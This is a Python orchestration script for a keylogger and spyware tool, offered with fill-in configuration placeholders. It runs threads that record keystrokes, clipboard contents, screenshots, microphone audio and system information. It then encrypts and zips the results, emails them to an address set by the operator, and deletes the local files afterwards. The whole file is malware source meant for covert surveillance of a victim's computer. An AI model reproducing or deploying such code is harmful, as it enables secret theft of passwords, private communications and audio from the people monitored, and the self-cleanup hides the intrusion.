#module imports
import threading
import time 
import os


# all function imports
import ss
import sys_info as si 
import send_email as mail
import keylogger as kl
import clipboard as cpb
import audio_capture as ac
import remove_files as rf
import encrypt as xxx
import zipping as zz

##file paths for accessing location [add double \\ to be safer]
file_path = "+EDIT-Enter file path [ex-ex-S:\\foldername\\folder having encrypted data]+"          # Enter the file path you want your files to be saved to


##key in double quotes[ex-"g5HerbAODsBWRNiuczyWaejbmse41thVkyCQ2PQnIjI="]
key="+EDIT-Enter Encryption key [ex-g5HerbAODsBWRNiuczyWaejbmse41thVkyCQ2PQnIjI=]+"      # encryption key (Take from script key_gen.py in another folder)


##folder name where all files will be created
fl_name="+EDIT-Enter folder-Name to store files [Keep it unique]+"                   #folder to store all files 

##zipfile name for mailing
zip_f="+EDIT-Enter zip file-Name+"                                                   #zip file name

if(zip_f.endswith(".zip")):
    pass
else:
    zip_f+=".zip" 


##file names that are gonna be created:
#edit names according to your needs
#make sure to enter file extensions correctly in double quotes["example.extension"]
keys_recorded_f="+EDIT-Enter log file name [ex-log.txt]+"                       #key_log file
ss_f="+EDIT-Enter screenshot file name [ex-ss.png]+"                            #Screenshots file 
sys_info_f="+EDIT-Enter system infornmation file name [ex-sys_info.txt]+"       #system information file
cb_info_f="+EDIT-Enter clipboard file name [ex-clipboard_info.txt]+"            #clipboard file
audio_rec_f="+EDIT-Enter audio file name [ex-audio.wav]+"                       #audio file


##edit according to requirements
#enter INT values ONLY 
#keep an idea of how long do u want the audio-recording to take-place and the script to run,key logger only runs for time-interval thats entered for the code

#complete Code execution settings                          
time_interval="+EDIT [ex-30]+"                   #time interval for each iteration               
iterations="+EDIT [ex-1]+"                       #no of iterations

#audio record timing
rec_time="+EDIT [ex-3]+"                         #audio recording time in seconds

#copy clipboard settings
cp_x="+EDIT [ex-4]+"                             #no of times u want to copy clipbaord data
cp_t="+EDIT [ex-2]+"                             #copy clipboard at time interval in seconds

#screenshot settings
ss_no="+EDIT [ex-3]+"                            #no of screenshots to be captured
ss_time="+EDIT [ex-2]+"                          #time interval for each screenshot    


## mailing details
#from email-address,password of from email-address & to email-address
#Enter all data here in double quotes["example@gmail.com" , "example_password"]
from_addr = "+EDIT [ex- XYZ@gmail.com]+"    # Enter email-from address here
password = "+EDIT [ex-password]+"              # Enter email password here
toaddr = "+EDIT [ex- XYZ@gmail.com]+"       # Enter the email address you want to send your information to


# Check whether the specified path exists or not
if os.path.exists(file_path):
    pass
else:
    file_path=os.getcwd()

#adding folder ot path
file_path += "\\"+fl_name

#checking if folder exist in path already
if os.path.exists(file_path):
    pass
else:
    os.mkdir(file_path)


file_path += "\\"


##ALL THE THREADS FOR THE FUNCTIONS

#system_information Thread 
si_t=threading.Thread(target=si.computer_information,args=( file_path+sys_info_f, ),daemon=True)

##tasks that require a repetition hence threading used for quicker execution
#screenshot Thread
ss_t=threading.Thread(target=ss.screenshot,args=(file_path,ss_f,ss_no,ss_time),daemon=True)

#clipboard Thread
cpd_t=threading.Thread(target=cpb.copy_clipboard,args=( file_path+cb_info_f,cp_x,cp_t ),daemon=True)

#audio_rec Thread
ac_t=threading.Thread(target=ac.microphone,args=(file_path+audio_rec_f,rec_time),daemon=True)

#keylogging Thread
kl_t=threading.Thread(target=kl.main,args=(file_path+keys_recorded_f,time_interval,),daemon=True)

#remove files Threads
rmf_t=threading.Thread(target=rf.remove,args=(file_path,),daemon=True)



def mail_files(path):
    mail.send_email(zip_f,path+zip_f,toaddr,from_addr,password)



if __name__ == '__main__':                  

    si_t.start()
    for x in range(iterations):
        cur_time = time.time()                  #to get current time
        stop_time = cur_time+time_interval      #stop time

        if(cur_time<stop_time):
            ac_t.start()                        #thread-1
            cpd_t.start()                       #thread-2
            ss_t.start()                        #thread-3
            kl_t.start()                        #thread-4
            kl_t.join()
            ac_t.join()                           
            time.sleep(5)
    
        xxx.main(file_path,key)                 #encrypting all files
        zz.zipper(file_path,zip_f)              #zipping all files         
        mail_files(file_path)                   #mailing files
        rmf_t.start()                           #clearing path
        rmf_t.join()
